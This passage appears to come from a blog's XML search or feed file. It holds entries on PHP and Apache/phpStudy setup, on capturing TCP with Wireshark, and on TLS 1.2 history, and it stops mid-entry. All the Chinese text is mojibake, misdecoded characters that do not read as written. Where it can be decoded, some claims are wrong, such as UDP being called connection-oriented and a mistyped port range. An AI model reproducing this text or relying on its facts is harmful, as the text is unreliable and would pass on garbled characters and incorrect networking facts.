ç½‘ç«™æ–‡ä»¶é…ç½®ï¼‰ã€‚</p><p>ç›®å‰æµè¡Œçš„æ¶æ„ï¼š</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/PHP/struct_popular.png" /></p><h2 id="ç½‘ç»œåº”ç”¨ä½“ç³»æ¶æ„">ç½‘ç»œåº”ç”¨ä½“ç³»æ¶æ„</h2><p>C/S æ¨¡å¼ï¼ˆç»“æ„ï¼‰ï¼šCï¼šClient ï¼ˆå®¢æˆ·ç«¯ï¼‰ã€Sï¼šServerï¼ˆæœåŠ¡å™¨ï¼‰</p><p>B/S æ¨¡å¼ï¼ˆç»“æ„ï¼‰ï¼šBï¼šBrowser ï¼ˆæµè§ˆå™¨ï¼‰ã€Sï¼šServerï¼ˆæœåŠ¡å™¨ï¼‰</p><h1 id="php-ç®€ä»‹">PHP ç®€ä»‹</h1><p>PHP ï¼šHypertext Preprocessor è¶…æ–‡æœ¬é¢„å¤„ç†å™¨ï¼Œï¼ˆPHP/FIï¼ˆformInterpreterï¼‰åœ¨ 1995 å¹´ç”± Rasmus Lerdorf åˆ›å»ºã€‚èµ·åˆè„šæœ¬å–åä¸ºâ€œPersonalHome Page Toolsâ€ï¼Œä¹Ÿæ˜¯ PHP åç§°çš„ç”±æ¥ã€‚ï¼‰æœ€æ–° PHP ç‰ˆæœ¬ PHP 7.0xã€‚</p><p><ahref="https://w3techs.com/technologies/details/pl-php/all/all">å…¨çƒå¤§çº¦80%çš„ç½‘ç«™</a>éƒ½æ˜¯ç”¨äº† PHP æŠ€æœ¯ä½œä¸ºç½‘ç«™åå°æœåŠ¡ç¨‹åºã€‚</p><h3 id="php-çš„ç‰¹ç‚¹">PHP çš„ç‰¹ç‚¹</h3><ul><li><p>Web æœåŠ¡å™¨ç«¯çš„ä¸»æµå¼€å‘è¯­è¨€ï¼Œç”¨æ¥å®ç°ç”¨æˆ·è¯·æ±‚ã€‚</p></li><li><p>å¼€æºè½¯ä»¶ï¼Œæ‰€æœ‰æ“ä½œç³»ç»Ÿä¸‹å‡å¯ä»¥è¿è¡Œ</p></li><li><p>å…¥é—¨ç®€å•ï¼Œå¿«é€Ÿå¼€å‘</p></li><li><p>æ”¯æŒä¸»æµçš„æ•°æ®åº“ï¼Œæ¯”å¦‚ï¼›MySQLã€MSSQLã€Oracle</p></li><li><p>php æ˜¯å¼±ç±»å‹è¯­è¨€(ä¸ JavaScript ç›¸ä¼¼)</p><ol type="1"><li><p>ä»å˜é‡è§’åº¦ï¼šåœ¨å£°æ˜ä¸€ä¸ªå˜é‡ä¸éœ€è¦å£°æ˜å…¶ç±»å‹ï¼Œè¿™äº‹ PHPçš„ç‰¹è‰²ï¼Œå› ä¸ºä»–äº¤ç»™äº†åº•å±‚</p><p>åº•å±‚çš„å˜é‡å­˜å‚¨æ˜¯åœ¨ä¸€ä¸ª zvalç»“æ„é‡Œï¼Œå£°æ˜ä¸€ä¸ªå˜é‡ä¼šæŠŠæ‰€æœ‰ç±»å‹éƒ½è€ƒè™‘åˆ°å¹¶å¼€è¾Ÿç©ºé—´ï¼ŒåŒç§ç±»å‹é»˜è®¤ç”¨æœ€å¤§é™åº¦å£°æ˜(intç”¨ long,float ç”¨ double)ï¼Œè¿™æ ·ç»å¯¹æ»¡è¶³çš„æ‰€æœ‰å˜é‡çš„éœ€æ±‚</p></li><li><p>ä»è¿ç®—çš„è§’åº¦ï¼šåº•å±‚ä¼šæ ¹æ®ä½ å½“å‰å˜é‡ç±»å‹åšè½¬æ¢å¹¶è¿ç®—ï¼Œå¹¶ä¸”è¿”å›ç»“æœåšç±»å‹è½¬æ¢ï¼ˆstring+string=int,float+string=float,sting('')==int0...ï¼‰ï¼›æ•°ç»„ä¹Ÿå¯ä»¥åŠ å‡å‚ä¸è¿ç®—ï¼›</p></li></ol></li></ul><h2 id="æ­å»ºç¯å¢ƒ">æ­å»ºç¯å¢ƒ</h2><p>æ–¹æ¡ˆä¸€ï¼šå¯ä»¥è‡ªå·±åˆ†åˆ«å®‰è£… Apacheï¼ŒMySQLï¼ŒPHPï¼Œé‰´äºå¤ªéº»çƒ¦ï¼Œå¼ƒç”¨ã€‚</p><p>æ–¹æ¡ˆäºŒï¼šå®‰è£…é›†æˆç¯å¢ƒ</p><p>é›†æˆç¯å¢ƒï¼š</p><ul><li><p>WampServer æ˜¯æ³•å›½äººå¼€å‘çš„ä¸€æ¬¾ Windows Apache Mysql PHPé›†æˆå®‰è£…ç¯å¢ƒï¼Œå³åœ¨ window ä¸‹çš„ apacheã€php å’Œ mysqlçš„æœåŠ¡å™¨è½¯ä»¶ã€‚</p></li><li><p>phpStudy æ˜¯ä¸€ä¸ª PHP è°ƒè¯•ç¯å¢ƒçš„ç¨‹åºé›†æˆåŒ…ã€‚è¯¥ç¨‹åºåŒ…é›†æˆæœ€æ–°çš„Apache+PHP+MySQL+phpMyAdmin+ZendOptimizerï¼Œä¸€æ¬¡æ€§å®‰è£…ï¼Œæ— é¡»é…ç½®å³å¯ä½¿ç”¨ï¼Œæ˜¯éå¸¸æ–¹ä¾¿ã€å¥½ç”¨çš„PHP è°ƒè¯•ç¯å¢ƒã€‚è¯¥ç¨‹åºä¸ä»…åŒ…æ‹¬ PHPè°ƒè¯•ç¯å¢ƒï¼Œè¿˜åŒ…æ‹¬äº†å¼€å‘å·¥å…·ã€å¼€å‘æ‰‹å†Œç­‰ã€‚</p></li></ul><p>è¿™é‡Œé€‰ç”¨ php study v8.0 æœ€æ–°ç‰ˆ.</p><h3 id="apache-é…ç½®ä¿¡æ¯ç®€ä»‹">Apache é…ç½®ä¿¡æ¯ç®€ä»‹</h3><p>apache å®‰è£…åï¼Œæœ‰ä¸€ä¸ªé»˜è®¤ç«™ç‚¹ï¼Œå…¶é…ç½®éƒ½åœ¨ apacheçš„ä¸»é…ç½®æ–‡ä»¶ï¼ˆapache/conf/httpd.confï¼‰ä¸­ã€‚ ä¸»è¦åŒ…æ‹¬å¦‚ä¸‹å‡ é¡¹ï¼š1ï¼Œç«™ç‚¹åŸŸåï¼š ServerName 1ocaltsst åŸŸåæ˜¯å¯ä»¥è®¾ç½®çš„ï¼2ï¼Œç«™ç‚¹ä½ç½®ï¼ˆæ–‡ä»¶å¤¹ä½ç½®ï¼‰ï¼š DocumentRoot H:itcastbj-quanzhan4</p><p>å¦‚æœæ˜¯ phpStudy å¸¦çš„ Apache çš„è¯ï¼ŒDocumentRoot åº”è¯¥æ˜¯ ..</p><p>ç«™ç‚¹ä½ç½®æ˜¯å¯ä»¥è®¾ç½®çš„ï¼ 3ï¼Œç«™ç‚¹æ–‡ä»¶å¤¹çš„è®¿é—®æƒé™è®¾ç½®ï¼šä½¿ç”¨-Directory&gt;..</Directory é…ç½®é¡¹æ¥é…ç½®ã€‚4ï¼Œç«™ç‚¹é»˜è®¤æ˜¾ç¤ºçš„ç½‘é¡µï¼ˆé¦–é¡µï¼‰ï¼šDirectoryIndex index.htmlé»˜è®¤ç½‘é¡µï¼ˆé¦–é¡µï¼‰æ˜¯å¯ä»¥è®¾ç½®çš„ã€‚5.1.3.ç½‘ç«™æ–‡ä»¶å¤¹è®¿é—®æƒé™çš„è®¾ç½®ã€‚æ–‡ä»¶å¤¹çš„è®¿é—®æƒé™çš„è®¾ç½®å½¢å¼å¦‚ä¸‹æ‰€ç¤ºï¼š<Directory â€œè¦è®¾ç½®æƒé™çš„æ–‡ä»¶å¤¹è·¯å¾„> Options è®¾ç½®é¡¹ AllowOverride è®¾ç½®é¡¹Require æƒé™è®¾ç½®é¡¹ <Directory> å„é¡¹è§£é‡Šå¦‚ä¸‹ï¼šOptionsï¼šç”¨äºè®¾ç½®ä¸€äº›ç³»ç»Ÿé€‰é¡¹ï¼Œé€šå¸¸ window ç³»ç»Ÿä¸­å°±ç”¨ Indexes å°±å¯ä»¥äº†ã€‚Options Indexes//è¡¨ç¤ºå…è®¸åˆ—å‡ºç›®å½•ç»“æ„ï¼ˆå¦‚æœæ²¡æœ‰å¯æ˜¾ç¤ºçš„ç½‘é¡µï¼‰AllowOverrideï¼šç”¨äºè®¾ç½®â€œå¯è¦†ç›–æ€§â€ï¼Œå³æ˜¯å¦å…è®¸åœ¨é¡¹ç›®æ–‡ä»¶ä¸­è¦†ç›–è¿™é‡Œçš„è®¿é—®æƒé™è®¾ç½®ï¼šAllowOverride All //è¡¨ç¤ºå¯è¦†ç›– AllowOverride None /è¡¨ç¤ºä¸å¯è¦†ç›–Requireï¼šç”¨äºè®¾ç½®å¯è®¿é—®æƒé™ï¼Œå¸¸ç”¨çš„æœ‰ï¼š</p><ul><li>å…è®¸æ‰€æœ‰æ¥æºçš„è®¿é—®ï¼šä¸€ä¸€æ¨è Require All granted</li><li>æ‹’ç»æ‰€æœ‰æ¥æºçš„è®¿é—®ï¼šä¸€ä¸€ç½‘ç«™éœ€è¦ä¸´æ—¶å…³é—­æ—¶ä½¿ç”¨ Require Alldenied</li><li>å…è®¸æ‰€æœ‰ä½†æ‹’ç»éƒ¨åˆ†æ¥æºçš„è®¿é—®ï¼š <RequireAll> Require all grantedRequire not ip 192.168.1.102 192.168.1.103 <RequireAl></li><li>æ‹’ç»æ‰€æœ‰ä½†å…è®¸éƒ¨åˆ†æ¥æºçš„è®¿é—®ï¼š <RequireAny> Require all deniedRequire ip 192.168.1.102 192.168.1.103 <RequireAny></li></ul><p>æ€»ç»“:</p><p>æµè§ˆå™¨å‡ºå‘ï¼ˆè¯·æ±‚ï¼‰--&gt; æ‰¾ hosts æ–‡ä»¶ --&gt; æ‰¾ç½‘ç»œä¸Š DNS æœåŠ¡--&gt; è¿›å…¥ç›¸åº”çš„æœåŠ¡å™¨--&gt; Apache--&gt; PHP --&gt; mysql æ•°æ®åº“æ¨¡å—--&gt; mysql æ•°æ®åº“ã€‚</p><p>Apache ä¸­è°ƒç”¨ PHP çš„è®¾ç½®ï¼š LoadModule php7_module â€œphpç›®å½•/php7apache2_4.dllâ€ AddType Application/x-httpd-php .php .php4.php3</p><p>hosts æ–‡ä»¶ä¸­çš„å†…å®¹ï¼š 127.0.0.1 <ahref="http://www.a.com">www.a.com</a> 127.0.0.1 www.quanzhan7.com127.0.0.1 www.php69.com PHP çš„åŸºæœ¬è®¾ç½®ï¼š è®¾ç½® php.ini çš„ä½ç½®ï¼š åœ¨ apacheçš„ä¸»é…ç½®æ–‡ä»¶(httpd.conf)ä¸­ï¼š PHPIniDir â€œphp ç›®å½•â€</p><p>è®¾ç½® php çš„è¿è¡Œæ—¶åŒºï¼š åœ¨ php.ini ä¸­è®¾ç½®ï¼š date.timezone = PRC PHPçš„æ¨¡å—è®¾ç½®ï¼ˆä»¥ mysqli æ¨¡å—ä¸ºä¾‹ï¼‰</p><p>#è®¾ç½® PHP çš„æ¨¡å—æ‰€åœ¨ä½ç½®ï¼ˆç›®å½•ï¼‰ extension_dir = â€œphp ç›®å½•/ext/â€</p><p>#å¼€å¯æ‰€éœ€è¦çš„æ¨¡å—ï¼š extension = php_mysqli.dll</p><p>mysql çš„å®‰è£…ä¸é…ç½®</p><p>æ³¨:ä½¿ç”¨ phpStudy å¹¶ä¸éœ€è¦ä¿®æ”¹ Apacheçš„é…ç½®ï¼Œä½†æ˜¯åœ¨è¿™é‡Œä»ä»‹ç»ä¸€ä¸‹ä¸€äº›é‡è¦çš„é…ç½®ï¼Œä¾¿äºç†è§£ï¼Œæ‰©å±•çŸ¥è¯†ï¼ˆå¦‚æœæƒ³è¦è¯¦ç»†äº†è§£ï¼Œè‡ªå·±æ­å»ºä¸€éwamp ç¯å¢ƒå°±å·®ä¸å¤šäº†ï¼‰ã€‚</p><h3 id="æ³¨æ„äº‹é¡¹">æ³¨æ„äº‹é¡¹</h3><p>mysql ç”¨æˆ·åå¯†ç éƒ½æ˜¯ root</p><p>phpMyAdmin è´¦å·å¯†ç å’Œ mysql ä¸€æ ·ï¼š root root</p><p>ä¸€ä¸ªç½‘ç«™ï¼Œå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚ä¸€ä¸ªç½‘é¡µï¼Œå°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚</p><p>192 å¼€å¤´ã€172 å¼€å¤´çš„ ip åœ°å€ï¼Œè§„å®šåªç”¨äºå±€åŸŸç½‘çš„ ipã€‚</p><p>æ¯ä¸ªç”µè„‘ï¼Œéƒ½æœ‰ä¸€ä¸ªæœ€ç²¾ç®€çš„æœ€å°è§„æ¨¡çš„â€œåŸŸåè§£ææœåŠ¡å™¨â€ï¼Œä¸º hostsæ–‡ä»¶ã€‚win10 ä¸­éœ€è¦æ“ä½œç³»ç»Ÿæƒé™æ‰èƒ½ä¿®æ”¹ã€‚</p><p>ä¿®æ”¹æ–¹å¼ï¼šä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ notepad.exe ï¼Œèœå•æ -&gt;æ–‡ä»¶ -&gt; æ‰¾åˆ°host æ–‡ä»¶, è¿™æ ·å°±å¯ä»¥ä¿®æ”¹åä¿å­˜äº†.</p><p>æ„Ÿæƒ³ï¼šä»¥åæœ‰åˆ«çš„éœ€è¦ï¼Œä¼šæ¥è§¦æ¯”è¾ƒå¤šçš„è¯­è¨€ï¼Œç­‰å“ªä¸€å¤©ï¼Œè¯¥æŠŠè¯­è¨€çš„åˆ†ç±»ï¼Œå¼ºå¼±ç±»å‹ï¼ŒåŠ¨æ€/é™æ€ï¼Œè§£é‡Š/ç¼–è¯‘ï¼Œä»€ä¹ˆçš„éƒ½ç†ç†æ€è·¯ï¼Œç„¶åæŠŠå­¦ä¹ ä¸€é—¨è¯­è¨€è¦å­¦å“ªå‡ éƒ¨åˆ†å¥½å¥½çœ‹çœ‹ã€‚è¿™æ ·ï¼Œä»¥åå­¦èµ·è¯­è¨€æ‰èƒ½å¾—å¿ƒåº”æ‰‹å‘€ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCPåè®®</title>
      <link href="/blog/2019/07/13/wireshark/tcp_protocol/"/>
      <url>/blog/2019/07/13/wireshark/tcp_protocol/</url>
      
        <content type="html"><![CDATA[<p>ç›®çš„ï¼š</p><ol type="1"><li>TCP ä¸ UDP åè®®çš„åŸºæœ¬æ¦‚å¿µ</li><li>TCP çš„ä¸‰æ¬¡æ¡æ‰‹ã€TCP çš„æ–­å¼€ä»¥åŠ TCP é‡ç½®çš„çŸ¥è¯†</li><li>å­¦ä¼šåˆ©ç”¨ Wireshark æ•è·å«æœ‰ TCP åè®®çš„æ•°æ®åŒ…</li></ol><h1 id="ç®€ä»‹">ç®€ä»‹</h1><p>TCPï¼ˆTransmission Control Protocol) æ˜¯é¢å‘è¿æ¥çš„ï¼Œå¯é çš„ï¼ŒåŸºäº IPçš„ä¼ è¾“å±‚åè®®ï¼Œæä¾›å¯é çš„ç«¯åˆ°ç«¯çš„ä¼ è¾“ã€‚</p><p>æ‰€æœ‰ TCP é€šè®¯éƒ½ä¼šä½¿ç”¨æºç«¯å£å’Œç›®çš„ç«¯å£ï¼Œè¿™äº›ä¿¡æ¯å¯ä»¥åœ¨ æ¯ä¸ª TCPæ•°æ®æŠ¥çš„å¤´éƒ¨æ‰¾åˆ°ã€‚è€Œä¸ºäº†å°†æ•°æ®ä¼ è¾“åˆ°è¿œç¨‹æœåŠ¡å™¨æˆ–è®¾å¤‡çš„ç‰¹å®šåº”ç”¨ç¨‹åºä¸Šï¼ŒTCPæ•°æ®åŒ…å¿…é¡»çŸ¥é“è¿œç¨‹æœåŠ¡æ‰€ç›‘å¬çš„ç«¯å£ï¼Œå¦‚æœæƒ³è¦å°è¯•è¿æ¥ä¸€ä¸ªä¸åŒäºè®¾ç½®çš„ç«¯å£ï¼Œé‚£ä¹ˆè¿æ¥å°±ä¼šå¤±è´¥ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒTCPä¼ è¾“è¿‡ç¨‹ä¸­çš„æºç«¯å£å¯ä»¥éšæ„é€‰æ‹©ã€‚ä¸€å°è®¡ç®—æœºæœ‰ 65535 ä¸ªç«¯å£ï¼Œå…¶ä¸­ 1-1024å±äºæ ‡å‡†çš„ç«¯å£ç»„ï¼Œå¾€å¾€æ˜¯ç‰¹å®šæœåŠ¡ä½¿ç”¨çš„ï¼Œ1024-65525å±äºä¸´æ—¶ç«¯å£ï¼Œéœ€è¦ä½¿ç”¨çš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šéšæœºæˆ–é‡‡ç”¨ç‰¹å®šçš„ç­–ç•¥æ¥åˆ†é…ç«¯å£ã€‚</p><p>UDP (User Datagram Protocol)æ˜¯é¢å‘è¿æ¥çš„ï¼Œæä¾›é¢å‘äº‹åŠ¡çš„ç®€å•çš„ï¼Œä¸å¯é çš„æœåŠ¡</p><h1 id="åŸç†">åŸç†</h1><p>é¦–å…ˆé€‰æ‹©ä¸€ä¸ªéšæœºçš„æºç«¯å£ï¼Œä¸å·²çŸ¥çš„ç›®çš„ç«¯å£è¿›è¡Œé€šä¿¡ï¼Œåœ¨å‘å‡ºæ•°æ®åŒ…åï¼Œè¿œç¨‹è®¾å¤‡ä¸åŸè®¾å¤‡ä½¿ç”¨å»ºç«‹èµ·çš„ç«¯å£è¿›è¡Œé€šè®¯ï¼Œæ‰€æœ‰åŸºäºTCP çš„é€šä¿¡éƒ½é€šè¿‡ä¸‰æ¬¡æ¡æ‰‹å¼€å§‹ã€‚</p><p>ä¸‰æ¬¡æ¡æ‰‹</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tcp_handshake.png" /></p><p>å››æ¬¡æ–­å¼€</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tcp_close.png" /></p><p>å¯ä»¥å¼€å¯åç§°è§£æï¼ˆå¼€å¯ä¼šæ¶ˆè€—èµ„æºï¼Œè€Œä¸”æœ‰äº›æ—¶å€™å¼€å¯è¿™äº›è§£æå¯èƒ½ä¼šå¯¹æˆ‘ä»¬çš„åˆ†æé€ æˆå¹²æ‰°ï¼‰ç¼–è¾‘ -&gt; é¦–é€‰é¡¹ -&gt; è§£æä¼ è¾“åç§°ï¼ˆè§£æ TCP / UDPç«¯å£ä¸ºæœåŠ¡åï¼Œæ¯”å¦‚ï¼š80 -&gt; httpï¼‰</p><p>Wireshark ä¸ºäº†è®©æˆ‘ä»¬åˆ†ææ–¹ä¾¿ï¼Œå¼•å…¥äº†ä¸€ä¸ªç‰¹æ€§ï¼Œè‡ªåŠ¨å°† TCPçš„åºåˆ—å·æ›¿æ¢ä¸ºç›¸å¯¹å€¼ï¼ˆä¹Ÿå°±æ˜¯å°† TCP æ¡æ‰‹çš„ seq å€¼ä»¥ 0ä½œä¸ºèµ·å§‹å€¼ï¼‰ï¼Œè€Œæˆ‘åœ¨è¿™é‡Œæˆ‘ä»¬æ›´å¸Œæœ›çœ‹åˆ°åŸå§‹å€¼ï¼Œå¯ä»¥å»ï¼šèœå•æ -&gt;ç¼–è¾‘-&gt; é¦–é€‰é¡¹-&gt;åè®®-&gt;TCP -&gt; å–æ¶ˆå‹¾é€‰ AnalyzeTCP sequence numbers</p><p>TCP é‡ç½® RST</p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒTCPè¿æ¥éƒ½æ˜¯ä»¥å››æ¬¡æ¡æ‰‹æ–­å¼€è¿æ¥çš„ï¼Œä½†æ˜¯åœ¨ç°å®ä¸­ï¼Œç½‘ç»œè¿æ¥æœ‰æ—¶ä¼šå‡ºç°æ–­æ‰çš„æƒ…å†µï¼Œå¯èƒ½æ˜¯é­å—åˆ°ç½‘ç»œæ”»å‡»æˆ–é…ç½®é”™è¯¯æƒ…å†µï¼Œæ¯”å¦‚ï¼šæœåŠ¡ç«¯æœªå¼€å¯å®¢æˆ·ç«¯è¦è¿æ¥çš„80 ç«¯å£æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šå‘é€ RST ç»ˆæ­¢è¿æ¥ã€‚</p><h1 id="æŠ“åŒ…">æŠ“åŒ…</h1><ol type="1"><li><p>æ‰“å¼€ Wiresharkï¼Œåœ¨æ•è·è¿‡æ»¤å™¨è¾“å…¥ï¼štcpï¼Œä»è€ŒåªæŠ“ TCPçš„åŒ…ï¼Œé€‰å¯¹æŠ“å–æ¥å£ï¼Œå¼€å§‹æŠ“å–ï¼Œç„¶åæ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®ä¸€ä¸ªç½‘å€ï¼ŒåŠ è½½å®Œåï¼Œå…³é—­è¯¥ç½‘å€ï¼Œç¨ç­‰å‡ ç§’ï¼Œåœæ­¢æŠ“å–ï¼ŒæŠ“åŒ…å®Œæ¯•ã€‚</p></li><li><p>è¿‡æ»¤å‡ºå»ºç«‹è¿æ¥ä»¥åŠæ–­å¼€è¿æ¥çš„æ•°æ®åŒ…ã€‚</p><p>åœ¨åˆ—è¡¨ä¸­çš„ info æ æ‰¾åˆ° å«æœ‰ syn æˆ– finçš„ä¸€ä¸ªæˆ–å‡ ä¸ªè®°å½•ï¼ˆæ‰¾ä¸åˆ°ï¼Œåœ¨æ˜¾ç¤ºè¿‡æ»¤å™¨ä¸Šè¾“å…¥ tcp.flags.syn == 1 æˆ–è€…è¾“å…¥ tcp.flags.fin == 1 ï¼‰ï¼Œç„¶åé€‰æ‹©ä¸€ä¸ªï¼Œå³é”® -&gt; å¯¹è¯è¿‡æ»¤å™¨ -&gt;é€‰æ‹© TCPï¼Œç»“æŸã€‚</p></li><li><p>æ­¤æ—¶ï¼Œå¦‚æœä½ æƒ³æŠŠè¿‡æ»¤å‡ºçš„è¿™å¯¹ä¼šè¯å•ç‹¬ä¿å­˜ï¼Œé€‰æ‹© æ–‡ä»¶-&gt;å¯¼å‡ºç‰¹å®šåˆ†ç»„ -&gt; å·¦ä¸‹è§’é€‰æ‹© All Packetï¼Œå³è¾¹é€‰æ‹©Displayedï¼ˆæ„æ€æ˜¯ä½ å½“å‰è¿‡æ»¤æ˜¾ç¤ºçš„åˆ†ç»„ï¼‰ï¼Œå†è¾“å…¥æ–‡ä»¶åï¼Œé€‰æ‹©ä½ç½®å³å¯ã€‚</p><p>å¯¼å‡ºç•Œé¢ä¸Šçš„ range æ ¼å¼</p><ol type="1"><li>4-9 ä»ç¬¬å››ä¸ªåˆ°ç¬¬ 9 ä¸ªæ•°æ®åŒ…</li><li>4.9.15 ç¬¬ 4 å·ï¼Œ9 å·ï¼Œ15 å·æ•°æ®åŒ…ã€‚</li></ol></li></ol><p>ï¼ˆæ³¨ï¼šå¦‚æœä½ è®¿é—®çš„ç½‘ç«™å¤ªå¤šï¼Œæƒ³æ‰¾è®¿é—®æŸä¸ªç½‘ç«™ï¼Œå¯ä»¥ç”¨ä¹‹å‰åšæ–‡â€œä»æ•°æ®åŒ…çœ‹ TLS1.2â€ æŠ“åŒ…é‚£é‡Œæ•™çš„æ–¹æ³•ï¼‰</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tcp_packets.png" /></p><p>æ„Ÿè§‰æ²¡å•¥è®²çš„å‘¢...ï¼Œè‡ªå·±çœ‹å§ï¼ŒæŒºç®€å•çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œåè®® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»æ•°æ®åŒ…çœ‹ TLS 1.2</title>
      <link href="/blog/2019/07/09/wireshark/tls_protocol_overview/"/>
      <url>/blog/2019/07/09/wireshark/tls_protocol_overview/</url>
      
        <content type="html"><![CDATA[<p>TLSï¼ˆTransport Layer Securityï¼‰å’Œå®ƒçš„ä¸Šä¸€ä»£ SSLï¼ˆSecure SocketsLayerï¼‰éƒ½ç”¨æ¥æä¾›ç½‘ç»œé€šä¿¡å®‰å…¨çš„åŠ å¯†åè®®ï¼Œå…¶ä¸­ SSLå¦‚ä»Šå·²ç»ä¸è¢«æ¨èä½¿ç”¨ã€‚è¿™äº›åè®®çš„ä¸€äº›ç‰ˆæœ¬åœ¨ webæµè§ˆå™¨ã€ç”µå­é‚®ä»¶ã€å³æ—¶é€šè®¯ä»¥åŠ IP ç”µè¯ç­‰æ–¹é¢è¢«å¹¿æ³›åœ°ä½¿ç”¨ç€ã€‚</p><p>TLSï¼ˆTransport Layer Securityï¼‰åè®®æ˜¯ Webä¸Šæœ€æµè¡Œçš„åŠ å¯†åè®®ï¼Œå®ƒé€šè¿‡ç¡®ä¿æµè§ˆå™¨ä¸æœåŠ¡ç«¯ä¹‹é—´çš„ä¿å¯†æ€§ä»¥åŠæ•°æ®çš„å®Œæ•´æ€§æ¥ä¿æŠ¤Web ä¸Šçš„ç”¨æˆ·ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å°†ä»‹ç» TLS 1.2ç‰ˆæœ¬ä¸­æ¡æ‰‹é˜¶æ®µ(å­åè®®)çš„ç»†èŠ‚ã€‚</p><p>TLS 1.2 ä¸­æ‰€æœ‰ä¸æ¡æ‰‹ç›¸å…³çš„å­åè®®éƒ½åœ¨ <ahref="https://www.ietf.org/rfc/rfc5246.txt">RFC5246</a>è¢«å®šä¹‰ï¼Œä¸‹é¢æˆ‘å°†é€šè¿‡ Wireshark æŠ“åŒ…çš„æ–¹å¼è¿›è¡Œè®²è§£</p><h1 id="ä¸€.-ä½œç”¨">ä¸€. ä½œç”¨</h1><p>ä¸ä½¿ç”¨ SSL/TLS çš„ HTTPé€šä¿¡ï¼Œå°±æ˜¯ä¸åŠ å¯†çš„é€šä¿¡ã€‚æ‰€æœ‰ä¿¡æ¯æ˜æ–‡ä¼ æ’­ï¼Œå¸¦æ¥äº†ä¸‰å¤§é£é™©ã€‚</p><blockquote><p>ï¼ˆ1ï¼‰<strong>çªƒå¬é£é™©</strong>ï¼ˆeavesdroppingï¼‰ï¼šç¬¬ä¸‰æ–¹å¯ä»¥è·çŸ¥é€šä¿¡å†…å®¹ã€‚</p><p>ï¼ˆ2ï¼‰<strong>ç¯¡æ”¹é£é™©</strong>ï¼ˆtamperingï¼‰ï¼šç¬¬ä¸‰æ–¹å¯ä»¥ä¿®æ”¹é€šä¿¡å†…å®¹ã€‚</p><p>ï¼ˆ3ï¼‰<strong>å†’å……é£é™©</strong>ï¼ˆpretendingï¼‰ï¼šç¬¬ä¸‰æ–¹å¯ä»¥å†’å……ä»–äººèº«ä»½å‚ä¸é€šä¿¡ã€‚</p></blockquote><p>SSL/TLS åè®®æ˜¯ä¸ºäº†è§£å†³è¿™ä¸‰å¤§é£é™©è€Œè®¾è®¡çš„ï¼Œå¸Œæœ›è¾¾åˆ°ï¼š</p><blockquote><p>ï¼ˆ1ï¼‰ æ‰€æœ‰ä¿¡æ¯éƒ½æ˜¯<strong>åŠ å¯†ä¼ æ’­</strong>ï¼Œç¬¬ä¸‰æ–¹æ— æ³•çªƒå¬ã€‚</p><p>ï¼ˆ2ï¼‰å…·æœ‰<strong>æ ¡éªŒæœºåˆ¶</strong>ï¼Œä¸€æ—¦è¢«ç¯¡æ”¹ï¼Œé€šä¿¡åŒæ–¹ä¼šç«‹åˆ»å‘ç°ã€‚</p><p>ï¼ˆ3ï¼‰ é…å¤‡<strong>èº«ä»½è¯ä¹¦</strong>ï¼Œé˜²æ­¢èº«ä»½è¢«å†’å……ã€‚</p></blockquote><p>äº’è”ç½‘æ˜¯å¼€æ”¾ç¯å¢ƒï¼Œé€šä¿¡åŒæ–¹éƒ½æ˜¯æœªçŸ¥èº«ä»½ï¼Œè¿™ä¸ºåè®®çš„è®¾è®¡å¸¦æ¥äº†å¾ˆå¤§çš„éš¾åº¦ã€‚è€Œä¸”ï¼Œåè®®è¿˜å¿…é¡»èƒ½å¤Ÿç»å—æ‰€æœ‰åŒªå¤·æ‰€æ€çš„æ”»å‡»ï¼Œè¿™ä½¿å¾—SSL/TLS åè®®å˜å¾—å¼‚å¸¸å¤æ‚ã€‚</p><p>äºŒã€å†å²</p><p>äº’è”ç½‘åŠ å¯†é€šä¿¡åè®®çš„å†å²ï¼Œå‡ ä¹ä¸äº’è”ç½‘ä¸€æ ·é•¿ã€‚</p><blockquote><p>1994 å¹´ï¼ŒNetScape å…¬å¸è®¾è®¡äº† SSL åè®®ï¼ˆSecure Sockets Layerï¼‰çš„ 1.0ç‰ˆï¼Œä½†æ˜¯æœªå‘å¸ƒã€‚</p><p>1995 å¹´ï¼ŒNetScape å…¬å¸å‘å¸ƒ SSL 2.0 ç‰ˆï¼Œå¾ˆå¿«å‘ç°æœ‰ä¸¥é‡æ¼æ´ã€‚</p><p>1996 å¹´ï¼ŒSSL 3.0 ç‰ˆé—®ä¸–ï¼Œå¾—åˆ°å¤§è§„æ¨¡åº”ç”¨ã€‚</p><p>1999 å¹´ï¼Œäº’è”ç½‘æ ‡å‡†åŒ–ç»„ç»‡ ISOC æ¥æ›¿ NetScape å…¬å¸ï¼Œå‘å¸ƒäº† SSLçš„å‡çº§ç‰ˆ<ahref="http://en.wikipedia.org/wiki/Secure_Sockets_Layer">TLS</a> 1.0ç‰ˆã€‚</p><p>2006 å¹´å’Œ 2008 å¹´ï¼ŒTLS è¿›è¡Œäº†ä¸¤æ¬¡å‡çº§ï¼Œåˆ†åˆ«ä¸º TLS 1.1 ç‰ˆå’Œ TLS 